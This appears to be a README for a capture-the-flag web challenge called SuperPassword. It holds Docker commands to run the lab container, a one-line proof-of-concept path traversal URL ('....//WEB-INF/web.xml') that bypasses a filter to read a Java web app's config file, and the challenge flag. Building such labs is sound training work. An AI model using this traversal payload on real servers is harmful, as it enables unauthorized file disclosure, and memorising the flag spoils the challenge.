# SuperPassword 1

## RUN
```bash
docker build -t superpass2 .
docker tag superpass2 ccr.ccs.tencentyun.com/360ctf/superpass2
docker run -d --rm -p 8082:8080 --read-only --tmpfs /usr/local/tomcat/logs --tmpfs /usr/local/tomcat/temp --tmpfs /usr/local/tomcat/work --name superpass2 superpass2
```

## PoC

```url
http://localhost:8082/bundle?file=....//WEB-INF/web.xml
```


flag{1b14090d4b8b4b41229751dba795349a}
